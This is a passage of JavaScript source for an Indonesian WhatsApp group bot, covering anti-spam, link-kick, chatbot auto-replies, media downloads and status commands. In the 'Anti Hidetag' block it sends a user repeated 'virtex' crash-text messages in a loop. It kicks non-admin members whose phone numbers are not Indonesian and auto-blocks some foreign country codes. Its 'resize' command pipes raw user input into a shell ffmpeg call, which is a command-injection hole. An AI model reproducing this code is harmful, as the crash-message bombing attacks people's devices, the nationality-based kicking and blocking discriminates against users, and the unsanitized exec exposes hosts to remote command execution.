last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
		
//================================================================================\\				
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
const reply = (teks) => {
Fan.sendMessage(from, { text: teks }, { quoted: setQuoted })
}
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ?  Fan.sendMessage(from, { text: teks, contextInfo: { "mentionedJid": memberr }}):  Fan.sendMessage(from, { text: teks, contextInfo: { "mentionedJid": memberr }},{quoted: setQuoted})
}
const sendMess = (hehe, teks) => {
Fan.sendMessage(hehe, { text, teks })
}
const buttonWithText = (from, text, footer, buttons) => {
return Fan.sendMessage(from, { text: text, footer: footer, templateButtons: buttons })
}
const math = (teks) => {
return Math.floor(teks)
}  
const sendGif = (teks, teksnya) => {
Fan.sendMessage(from, { video: teks, caption: "Nih!",gifPlayback: true},{quoted: setQuoted})
}; 
const sendvn = (teks) => {
Fan.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true}, {quoted: setQuoted})
}        
const sendSticker = (pesan) => {
Fan.sendMessage(from, {sticker: pesan}, {quoted:setQuoted })
}
//================================================================================\\
const onlyOwner = async() =>{
if (autovn){
sendvn(gakmau)
}else if (autoSticker){
sendSticker(khususowner)
}else {
setReply(mess.only.ownerB)
}
}
//OnlyAdmin
const onlyAdmin = async() =>{
if (autovn){
sendvn(gakmau)
}else 
if (autoSticker){
sendSticker(hanyaadmin)
}else {
setReply(mess.only.admin)
}
}
//OnlyBadmin
const onlyBadmin = async() =>{
if (autoSticker){
sendSticker(jadiinadmin)
}else {
setReply(mess.only.Badmin)
}
}
	
const onlyGroup = async() =>{
setReply(mess.only.group) 
}	

const onlyWait = async() =>{
if (autoSticker){
sendSticker(spam1)
}else {
setReply(mess.wait)
}
}				
//================================================================================\\
const addSpammer = function(jid, _db){
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
_db[position].spam += 1
 } else {
let bulin = ({ id: jid, spam: 1 })
 _db.push(bulin)     
}
}

const FinisHim = async function(jid, _db){
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
if(_db[position].spam > 5){
let Name = await Fan.getName(jid+ `@s.whatsapp.net`)
if(cekBannedUser(jid, ban) && !isOwner){return}
addBanned(Name,calender,  jid, ban)          
console.log(`${jid} Terdeteksi spam lebih dari ${_db[position].spam} kali`)
setReply("Kamu telah di banned karena melakukan spam")
}
} else {
console.log(`Spam ke ${_db[position].spam}`)
}
}
//================================================================================\\
//ANTI SPAM BERAKHIR
if(SpamExpired(senderNumber, "Case", AntiSpam)){
console.log("Sukses remove spammer")
}
SpamExpired(senderNumber, "NotCase", AntiSpam)
if(cekBannedUser(senderNumber, ban) && !isOwner){return}
if(cekSpam("Case",senderNumber, AntiSpam)){
addSpammer(senderNumber, spammer)
FinisHim(senderNumber, spammer)
console.log("antispam Case aktif")
return
}


//ANTI SPAM PRIVATE CHAT
if (antiSpam && isCmd && msgFilter.isFiltered(from) && !isGroup && !itsMe && !isOwner ) {
addSpam("Case",senderNumber, "30s", AntiSpam)
addSpammer(senderNumber, spammer)
if(autovn) {
return sendvn(nospam)
} else {
return setReply(textspam)
}
}

//ANTI SPAM GROUP CHAT     
if (antiSpam && isCmd && msgFilter.isFiltered(from) && isGroup && !itsMe && !isOwner) {
addSpam("Case",senderNumber, "30s", AntiSpam)
addSpammer(senderNumber, spammer)
if(autovn) {
return sendvn(nospam)
} else {
return setReply(textspam)
}
}
if (isCmd && !isOwner) msgFilter.addFilter(from)


//================================================================================\\
 //ANTI LINK GROUP
if (isGroup && isAntilinkGc && budy.includes(`chat.whatsapp.com`)) {
if (isGroupAdmins) return setReply('admin grup mah bebas yekan :v')
let linkgc = await Fan.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return setReply('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
setReply(` *「 LINK GROUP DETECTED 」*\nKamu mengirimkan link group, maaf kamu di kick dari grup :(`)
setTimeout(() => {
Fan.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}, 2000)
}   

 //ANTI LINK 
if (isGroup && isAntiLink){
if (budy.includes(`https:`)) { 
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
let linkgc = await Fan.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return setReply('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
setReply(` *「 LINK DETECTED 」*\nKamu mengirimkan link, maaf kamu di kick dari grup :(`)
setTimeout(() => {
Fan.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}, 2000)
}
}

//ANTI VIRUS
if (isGroup && isAntiVirtex && budy.length > 20000) {
if (isGroupAdmins) return setReply('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
await Fan.sendMessage(from, {text:antivirus(pushname,groupName)})
if (!isBotGroupAdmins) {return }
if(isOwner) {return}
await Fan.groupParticipantsUpdate(from, [sender], 'remove')
await Fan.sendMessage(`${nomerOwner}@s.whatsapp.net`,{text: `Hai Owner! wa.me/${sender.split("@")[0]} Terdeteksi Telah Mengirim Virtex ${isGroup?`di Group ${groupName}`:''}`})
 }
 
 //ANTI ASING/BULE OK
if (isGroup && isBotGroupAdmins && isKickarea && !itsMe) {    
let member = await groupMembers.map(u => u.jid)
for ( let i = 0; i <member.length; i++){  
if (member[i].slice(0,2) !== "62" ){     	
let usersId = await groupMembers.find(u => u.jid == member[i]) 
if (!usersId.groupAdmins ){
 await Fan.groupParticipantsUpdate(from, [member[i]], 'remove')
}
}
}
}  

//Anti Hidetag
if(budy.startsWith(`${prefix}hidetag`) && isAntihidetag){
if(isGroupAdmins) await Fan.groupParticipantsUpdate(from, [sender], 'demote')
for (let i = 0; i < 10; i++) {
await Fan.sendKatalog(sender, virtex8(prefix), virtex8(prefix), thumb, {quoted: setQuoted})
let a = await Fan.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: mek.id } } })
await Fan.sendMessage(sender, { text: "awowkwkwk" }, { quoted: a });
await Fan.sendMessage(sender, { text: "awowkwkwk" }, { quoted: lep });
await sleep(1000)
}
}

//Auto Hit 
if(isCmd){
AddHit(senderNumber, user)
cmdAdd("run", "1d", hitnya)
}
expiredCmd(hitnya, dash)
const thisHit = `${getHit("run", hitnya)}`

//================================================================================\\
if(textMenu === "menu1"){
var menunya = menu1(senderNumber, user, thisHit, publik, sender, prefix, isPremium, pushname)
} else if(textMenu === "menu2"){
var menunya = menu2(senderNumber, user, thisHit, publik, sender, prefix, isPremium, pushname)
} else if(textMenu === "menu3"){
var menunya = menu3(senderNumber, user, thisHit, publik, sender, prefix, isPremium, pushname, ucapanWaktu)
}
//================================================================================\\
if(textFitur === "fitur1"){
var fiturnya = fitur1(prefix)
} else if(textFitur === "fitur2"){
var fiturnya = fitur2(prefix)
} else if(textFitur === "fitur3"){
var fiturnya = fitur3(prefix)
}
//========================================================================================================================//
if ( isHit && !itsMe && isCmd ) {

try {
if (userLevel === undefined && userId === undefined) {
addUserId(calender, pushname, senderNumber, user)
}

if (autoLevel){
addLevelingXp(senderNumber, amountExp, user)
}
if (autoLevel && userExp >= requiredExp || autoLevel && userExp == requiredExp) {
addLevelingLevel(senderNumber, 1, user)
resetLevelingXp(senderNumber, userExp, user)


let anune =`${userLevel}0000`
let susu = randomNomor(math(anune))
tambahLimit(sender, susu)





let levelnih = userLevel + 1

let teks = `*]───「 LEVEL UP 」───[*

🆔 Nama : ${pushname} 
✅ Verified : ${userVerified}
📉 Limit : ${getLimit(sender)}
🧬 Level : ${userLevel}
🔰 Pangkat : ${userLeveling(userLevel)}
⚡ Exp :  ${userXp(userPersen)} ${persenya.split(".")[0]}%`
//but = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: `ᴘʀᴏғɪʟᴇ` }, type: 1 },{ buttonId: `${prefix}shop`, buttonText: { displayText: `sʜᴏᴘ` }, type: 1 } ];         
await setReply(teks)
}
} catch (err) {
console.error(err)
}
}
//========================================================================================================================//
let colors = ['red','white','black','blue','yellow','green','magenta','cyan','pink','gold','purple','navy','gray']
const isImage = (type === 'imageMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isAudio = (type == 'audioMessage')
const isText = (type == 'conversation')
const isMedia = (type === 'imageMessage' || type === 'videoMessage')
const isViewOnce = (type == 'viewOnceMessage')
const isAllMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedextendedText = type === 'extendedTextMessage' && content.includes('extendedTextMessage')
const isReplySticker = type === 'stickerMessage' && content.includes('stickerMessage')
const isQuotedReplySticker = type === 'stickerMessage' && content.includes('extendedTextMessage')
const mentionByReplySticker = type == "stickerMessage" && mek.message.stickerMessage.contextInfo != null ? mek.message.stickerMessage.contextInfo.participant || "" : ""

//AUTO BIO
//Fan.setStatus(`${botName} | ⏰ ${runtime(process.uptime() )} | 🔋 Error`) //.catch((_)=>_);

//SIMINYA BAWG        
if (autorespon === true && !isGroup && !isCmd && !itsMe) {
let simi = await fetchJson(`https://api.simsimi.net/v2/?text=${body}&lc=id`)
let sami = simi.success
Fan.sendMessage(from, { text: sami }, {quoted: setQuoted})           
}


//AUTO RESPON SIMI VIA REPLY/TAG BOT
if (Pe == botNumber && isGroup && !isCmd && !isAudio || mentionByReplySticker == botNumber && isSticker && !isCmd) {
try{	
await sleep(2000)
Fan.sendPresenceUpdate('composing', from) 
if(isQuotedReplySticker || isReplySticker ){
await sleep(2000)
let namastc = await pickRandom(setiker)
console.log(namastc)
let buffer = fs.readFileSync(`./media/sticker/stick/${namastc}.webp`)
Fan.sendMessage(from, {sticker: buffer}, {quoted:setQuoted })
} else{

let jawab = ["Afa iyah 🗿","Oh","Aku ga ngerti om 🐦","Boong","🗿","🐦","Oh gitu 🐦"]        
let teks1 = pickRandom(jawab)
let teks2 = body
let hasil = [`${teks1}`,`${teks2}`]
let random = pickRandom(hasil)

let simi = await fetchJson(`https://api.simsimi.net/v2/?text=${Pe}&lc=id`)
let sami = simi.success  

 if(sami.startsWith("Aku tidak mengerti")){
var teksnya = random
} else {
var teksnya = sami
}
   await sleep(2000)
 Fan.sendMessage(from,{text: teksnya},{quoted: setQuoted})  
//setReply(`${teksnya}`)
}
} catch (err){
console.log(err)
setReply("Simi ga tau mau ngomong apa")
}
}

//Make Sticker
async function makeSticker(media,Sticker, StickerTypes){
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await Fan.sendMessage(from,{sticker: nah},{quoted: setQuoted})
await fs.unlinkSync(stok)
}


//DOWNLOAD MP4
const downloadMp4 = async (Link ) => {
try{
await ytdl.getInfo(Link);
let mp4File = getRandom('.mp4') 
console.log(color("Download video with ytdl-core"))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on("finish", async () => {    
await Fan.sendMessage(from, { video: fs.readFileSync(mp4File), caption: "Nih!",gifPlayback: false},{quoted: setQuoted})
fs.unlinkSync(`./${mp4File}`)
})     
} catch(err) {
setReply(`${err}`)
}
}


//DOWNLOAD MP3
const downloadMp3 = async (Link ) => {
try{
await ytdl.getInfo(Link);
let mp3File = getRandom('.mp3') 
console.log(color("Download audio with ytdl-core"))
ytdl(Link, {filter: 'audioonly'})
.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {  
await Fan.sendMessage(from, {audio:  fs.readFileSync(mp3File), mimetype: 'audio/mp4' },{ quoted: setQuoted })
fs.unlinkSync(mp3File)
})       
} catch (err){
console.log(color(err))
}
} 

//SOUND CLOUD DOWNLOAD MP3
const scdlMp3 = async (Link ) => {
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(Link);
let mp3File = getRandom('.mp3') 
let opusFile = `${track.title}.opus`
let stream = await scdl.download(Link)
stream.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {   
	
let request = new FFMPEGRequest({
Pe: {
path: mp3File
},
output: {
path: opusFile,
bitrate: 128
}
});

Ffmpeg.convert(request)
.then( async filePath => {
  // Done
await Fan.sendMessage(from, {contextInfo: {
externalAdReply: {
title: 'Speed', 
body: 'Now Playing...',
description: 'Now Playing...',
mediaType: 2,
thumbnail: await (await fetch('https://telegra.ph/file/76f08bd0aeb06c3e0c0d5.jpg')).buffer(),
mediaUrl: `https://youtube.com/watch?v=uIedYGN3NQQ`
}
}, audio:  fs.readFileSync(filePath), mimetype: 'audio/mp4' },{ quoted: setQuoted })
fs.unlinkSync(mp3File)
fs.unlinkSync(opusFile)
})
.catch(error => {
setReply(error)
})
})     
}



//SOUND CLOUD DOWNLOAD MP3 DOCUMENT
const scdlDoc= async (Link ) => {
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(Link);
let mp3File = `./${track.title}.mp3`
let stream = await scdl.download(Link)
stream.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {    
await Fan.sendMessage(from, {audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' },{ quoted: setQuoted })
fs.unlinkSync(mp3File)
})       
} 




if (isCmd && !isGroup)		    
console.log(color('[ CP ]'), color(time, 'blue'), color(`${command} [${args.length}]`, 'cyan'), color(`pesan dari`, 'yellow'), color(pushname, 'orange'), color(`${sender}`, 'deeppink'))        
if (isCmd && isGroup)            
console.log(color('[ GC ]'), color(time, 'blue'), color(`${command} [${args.length}]`, 'cyan'), color(`pesan dari`, 'yellow'), color(pushname, 'orange'), 'in', color(groupName, 'deeppink'))
if (!isGroup) 
console.log(color("[ CMD ]"), color(moment.tz('Asia/Jakarta').format('HH:mm'), 'blue'), color(`[${args.length}]`, 'cyan'), color('pesan dari', 'yellow'), color(`${pushname}`, 'orange'))
if (isGroup) 
console.log(color("[ CMD ]"), color(moment.tz('Asia/Jakarta').format('HH:mm'), 'blue'), color(`[${args.length}]`, 'cyan'), color('pesan dari', 'yellow'), color(`${pushname}`, 'orange'), color('di gc'), color(groupName, 'deeppink'))

//AUTO BLOCK NOMER ASING +212
let nomerAsing = senderNumber.startsWith('212') || senderNumber.startsWith('252') || senderNumber.startsWith('92') || senderNumber.startsWith('967')
if (!isGroup && nomerAsing) {
await addBlock(sender, blocked)
console.log(`Nomer asing dari ${senderNumber}`)
return Fan.updateBlockStatus(sender, "block") 
} 

//AUTO RESPON STICKER
if (setiker.includes(messagesC)){
let namastc = messagesC
let buffer = fs.readFileSync(`./media/sticker/stick/${namastc}.webp`)
Fan.sendMessage(from, {sticker: buffer}, {quoted:setQuoted })
}
	
//AUTO RESPON VN
for (let anju of audionye){
if (budy === anju){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return sendSticker(spam2)
let buffer = fs.readFileSync(`./media/audio/${anju}.mp3`)
Fan.sendMessage(from, { audio: buffer, mimetype: 'audio/mp4', ptt: true}, {quoted: setQuoted})
addSpam("NotCase",senderNumber, "10s", AntiSpam)
}
}

 

//Auto React
let regex =[ "bilek","banh","cum","kntl","anjing","mmk","bang","wibu","pantek","pepek","hentai"]
for (let i of regex){
if (!cekSpam("NotCase",senderNumber, AntiSpam) && isGroup && budy.toLowerCase().includes(i)){ 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
let emot = await pickRandom(["🗿", "👍", "🙄", "😝", "😏", "💩", "👻", "🔥", "🤣","🤬", "😎", "😂", "😘", "😑", "😱", "❤️", "🔥", "😳","😍","🤩","🥳","🤔","🤗","🤤","👎","👊","🙈","🤡"])
Fan.sendMessage(from, { react: { text: emot, key: mek.key } })	
}
}

  
// Banchat
if (isGroup && isBanchat) {
if (!itsMe && !isOwner) return 
 }


//AUTO BLOCK CMD
for (let i = 0; i < listcmdblock.length ; i++) {
if (command === listcmdblock[i].cmd ){
if(autoblockcmd) {
return setReply(mess.block.Bsystem)
} else{
return setReply(mess.block.Bowner)
}
}
}

  
Fan.math = Fan.math ? Fan.math : {}
if(isGroup && from in Fan.math){
console.log(Fan.math)
try{
let id = from
if (!(id in Fan.math) && /^apa hasil dari/i.test(budy)) return setReply('soal itu sudah berakhir')
let math = JSON.parse(JSON.stringify(Fan.math[id][1]))
if (budy == math.result) {
clearTimeout(Fan.math[id][3])
delete Fan.math[id]
await setReply(` benar\n\n${math.bonus} XP\n\nmath ${math.mode}`)
} else {
    
if (--Fan.math[id][2] == 0) {
clearTimeout(Fan.math[id][3])
delete Fan.math[id]
setReply(`*kesempatan habis!*\njawabannya adalah *${math.result}*`)
} else setReply(`*jawaban salah!*\nmasih ada ${Fan.math[id][2]} kesempatan`)
}
}catch(e){

console.log(e)
}
}

if (roomChat && !isCmd && !isGroup && roomChat.b !=="") {
let other = [roomChat.a, roomChat.b].find(user => user !== m.sender)
m.copyNForward(other, true)
}

if (room && Date.now() >= room.expired){
await Fan.sendMessage(room.a, {text:"Partner tidak di temukan\nKamu telah keluar dari room anonymous"})
anonChat.splice(anonChat.indexOf(room, 1)) 
fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))

}                 


//add to dashboard
if(isCmd) Succes(toFirstCase(command), dash)
//==========================================================\\
try{
switch(command) {
case 'menu':
let mok = [
{"buttonId": `${prefix}owner`,"buttonText": {"displayText": `ᴏᴡɴᴇʀ`},"type": "RESPONSE"},
{"buttonId": `${prefix}infobotz`,"buttonText": {"displayText": `ɪɴғᴏ ʙᴏᴛᴢ`},"type": "RESPONSE"},
{"buttonId": `${prefix}sewa`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
const muk = [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `${nomerOwner}` } },
{ urlButton: { displayText: `Source Code`, url : `https://github.com/Aztecs444/extream` } },
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `${prefix}rules` } },
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `${prefix}infobotz` } },
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `${prefix}sewa` } }
]
let options1 =
{ forward,
externalAdReply: {
showAdAttribution: true, 
title: botName, 
body: fake,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnail: ofrply,
sourceUrl: `https://wa.me/${nomerOwner}`
}
}

/*let options1 =
{ forward,
externalAdReply: {
title: `⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻`, 
body: `   ━━━━⬤──────────    click here to play music `,
description: 'Now Playing...',
mediaType: 2,
thumbnail: ofrply,
mediaUrl: "https://youtu.be/v4kWLu4Eb1Y",
sourceUrl: "https://www.youtube.com/watch?v=JJwLesqqcmM"
}
}*/
if(setmenu == "document"){
Fan.sendButDoc(from, menunya+readmore+"\n"+fiturnya,fake,dfrply, mok, options1, {quoted: setQuoted})
} else if(setmenu == "location"){
Fan.sendButLoc(from, menunya,""+readmore+fiturnya+"\n"+fake,ofrply, mok, options1)
} else if(setmenu == "image"){
Fan.sendButImage(from, menunya, readmore+fiturnya, ofrply,mok) 
} else if(setmenu == "image2"){
Fan.send5ButImg (from, menunya+readmore+"\n"+fiturnya,fake, ofrply, muk) 
} else if(setmenu == "gif"){
Fan.send5ButGif (from, menunya+readmore+"\n"+fiturnya,fake, fs.readFileSync(`./media/video/video.mp4`), muk) 
} else if(setmenu == "location2"){
Fan.send5ButLoc(from, menunya+readmore+"\n"+fiturnya,fake, ofrply, muk) 
} else if(setmenu == "katalog"){
Fan.sendKatalog(from, "ALL MENU BOT", menunya+readmore+"\n"+fiturnya, ofrply, {quoted: setQuoted})
}
break
case 'inspect':{
const rex1 = /chat.whatsapp.com\/([\w\d]*)/g;
let code = q.match(rex1);
if (code === null) return  setReply("No invite url detected.");
code = code[0].replace("chat.whatsapp.com/", "");
let { id, subject,creator,creation,desc,descId } = await Fan.inspectLink(code).catch(async () => {
return setReply("Invalid invite url.");
});
let text =
`Subject: ${subject}\nGroupId: ${id}${creator ? `\nCreator: ${creator.split("@")[0]}` : ""}
Create At: ${new Date(creation * 1000).toLocaleString()}` +`${desc ? `\nDesc: ${desc}\nDescId: ${descId}` : ""}`
setReply(text)

}
break
case 'resize':
if (isQuotedImage || isImage) {
if(!q) return setReply(`Masukan ukuran panjangxlebar, contoh ${prefix+command} 300x300`)
onlyWait() 
let panjang = q.split('x')[0] 
let lebar = q.split('x')[1] 
let media = await Fan.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.jpeg')
exec(`ffmpeg -i ${media} -vf scale=${panjang}:${lebar}  ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
await Fan.sendMessage(from, {mimetype: 'image/jpeg', image: buffer453, caption: `Nih ${q}`}, { quoted: setQuoted})
fs.unlinkSync(ran)
})
} else {
setReply("Reply Imagenya")
}
break
case 'owner':
Fan.sendKontak(from, nomerOwner, ownerName)
break

case 'sewa':{
let { dada } = require("./message/sewabot.js")
let teks = dada(prefix, pushname, ucapanWaktu)      
let gbutsan = [{buttonId: `${prefix}owner`, buttonText: {displayText: `ᴏᴡɴᴇʀ`}, type: 1},
{buttonId: `KODE QR`, buttonText: {displayText: `ᴋᴏᴅᴇ ϙʀ`}, type: 1}]  
Fan.sendButLoc(from, teks, fake, ofrply, gbutsan)                          
}
break
case 'dashboard':{
let teks =`
*Dashboard*
        
Runtime : ${runtime(process.uptime())}
Total Hit : ${thisHit.toLocaleString()}`
let fall ="*Commands Today*  \n"
let totalFail =[]
let totalSuc = []
let total = 0
let tot = 0
await dash.map(async function(e, i){
fall += (i+1)+`. ${e.cmd} : ${e.succes+e.failed} \n`   
await totalFail.push(e.failed)
await totalSuc.push(e.succes)
});     
for(let i = 0; i < totalFail.length; i++){
total += totalFail[i]
} 
for(let a = 0; a < totalSuc.length; a++){
tot += totalSuc[a]
} 
let akoh = `Total : ${dash.length} used`
let tod ="*Command Failed*\n"
let filteredArray = await dash.filter(item => item.failed > 0 )
await filteredArray.map(async function(e, i){
tod += (i+1)+`. ${e.cmd} : ${e.failed} \n`   

});
let aw = `Total : ${filteredArray.length} failed`    
let tekz = teks+"\n\n"+fall+"\n"+akoh+"\n\n"+"*Command Status* \n"+" -Succes : "+tot+"\n"+" -Failed : "+total+"\n\n"+tod+"\n\n"
setReply(tekz)                                                        
}
break
case 'info':{
const si = require('systeminformation');
let OsInfo = await si.osInfo()
let System = await si.system()
let Cpu = await si.cpu()
let Mem = await si.mem()
let {platform,distro,release,codename,kernel,arch,hostname,fqdn,codepage,logofile} = OsInfo
let { manufacturer,brand,vendor,family,model,stepping,revision,voltage,speed,speedMin,speedMax,governor,cores,physicalCores,processors} = Cpu
let { total,free,used,active,available,buffers,cached,slab,buffcache} = Mem
let teks =`System Information`
 teks +=`

Uptime : ${kyun(os.uptime())}

*OS INFO*
Platform: ${platform}
Distro: ${distro}
Release: ${release}
Codename: ${codename}
Kernel: ${kernel}
Arch: ${arch}
Hostname: ${hostname}
Codepage: ${codepage}

*CPU INFO*
Manufacturer: ${manufacturer}
Brand: ${brand}
Vendor: ${vendor}
Family: ${family}
Model: ${model}
Speed: ${speed} Ghz
Governor: ${governor}
Cores: ${cores}
PhysicalCores: ${physicalCores}
Processors: ${processors}

*MEMORY INFO*
Memory : ${FileSize(used)}/${FileSize(total)} 
Free : ${FileSize(free)}
Cached: ${FileSize(cached)}
`
setReply(teks)
}    
break 
case 'me': case 'profile':{
let ppimg = await Fan.profilePictureUrl(sender, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
let sol = await Fan.fetchStatus(sender)
let stst = sol.status == 401 ? '' : sol.status
let hituser = gethitUser(senderNumber, user)
let persenya =`${userPersen}`
let nana =`${userExp}/${requiredExp}`
let teks = `*]────「 Profile User 」────[*

🆔 Nama : ${pushname} 
✅ Verified : ${userVerified}
📇 Status : ${isOwner ? 'Owner':'User'}
🧬 Level : ${userLevel}
🔰 Pangkat : ${userLeveling(userLevel)}
⚡ Exp :  ${userXp(userPersen)} ${persenya.split(".")[0]}%
♻️ Total Exp : ${nana}
📟 User Hit : ${hituser}
📉 Limit : ${getLimit(sender)}
📲 No : wa.me/${sender.split("@")[0]}
🧸 Bio : ${stst}`
setReply(teks) 
}
break
case 'status':{
let osu = require('node-os-utils')
try {
let NotDetect = 'Not Detect'
let old = performance.now()
let cpu = osu.cpu
let cpuCore = cpu.count()
let drive = osu.drive
let mem = osu.mem
let netstat = osu.netstat
let OS = osu.os.platform()
let cpuModel = cpu.model()
let cpuPer
let p1 = cpu.usage().then(cpuPercentage => {
var cpuPer = cpuPercentage
}).catch(() => {
var cpuPer = NotDetect
})
let driveTotal, driveUsed, drivePer
let p2 = drive.info().then(info => {
driveTotal = (info.totalGb + ' GB'),
driveUsed = info.usedGb,
drivePer = (info.usedPercentage + '%')
}).catch(() => {
driveTotal = NotDetect,
driveUsed = NotDetect,
drivePer = NotDetect
})
let ramTotal, ramUsed
let p3 = mem.info().then(info => {
ramTotal = info.totalMemMb,
ramUsed = info.usedMemMb
}).catch(() => {
ramTotal = NotDetect,
ramUsed = NotDetect
})
let netsIn, netsOut
let p4 = netstat.inOut().then(info => {
netsIn = (info.total.inputMb + ' MB'),
netsOut = (info.total.outputMb + ' MB')
}).catch(() => {
netsIn = NotDetect,
netsOut = NotDetect
})
await Promise.all([p1, p2, p3, p4])
await setReply(`_Testing ${command }..._`)
let _ramTotal = (ramTotal + ' MB')
let neww = performance.now()
let teks =`
*「 Status 」*

OS : *${OS}*
CPU Model : *${cpuModel}*
CPU Core : *${cpuCore} Core*
CPU : *${cpuPer? `${cpuPer}%`:"Not Found"}*
Ram : *${ramUsed} / ${_ramTotal}(${/[0-9.+/]/g.test(ramUsed) &&  /[0-9.+/]/g.test(ramTotal) ? Math.round(100 * (ramUsed / ramTotal)) + '%' : NotDetect})*
Drive : *${driveUsed} / ${driveTotal} (${drivePer})*
Ping : *${Math.round(neww - old)} ms*
Internet IN : *${netsIn}*
Internet OUT : *${netsOut}*
`
let mok = [
{"buttonId": `${prefix}infobotz`,"buttonText": {"displayText": `ɪɴғᴏ ʙᴏᴛᴢ`},"type": "RESPONSE"},
{"buttonId": `${prefix}sewa`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
Fan.sendButLoc(from, teks,fake,ofrply, mok)
} catch (err) {
setReply(err)
}
} 
break
case 'del':
if (mentionByReply == botNumber) {
Fan.sendMessage(from, { delete: { remoteJid: from, fromMe: true, id: mek.quoted.id, participant: mentionByReply } })
} else  {
setReply("Reply pesan bot nya")
}
break
case 'ping': {
let timestamp = speed()
let latensi = speed() - timestamp
let neww = performance.now()
let oldd = performance.now()
let respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
setReply(respon)
}
break
case 'runtime':
setReply(`⏰ Bot aktif selama ${runtime(process.uptime())}`)
break
case 'speed':
setReply(`Speed: ${latensi.toFixed(4)} Second`)
break
case 'ss':{
if (!q) return setReply("Masukan Link")
if (!isUrl(args[0]) && !args[0].includes('www.')) return setReply("Link error");
if (args.length < 1) return setReply('Urlnya mana om')
let teks = q
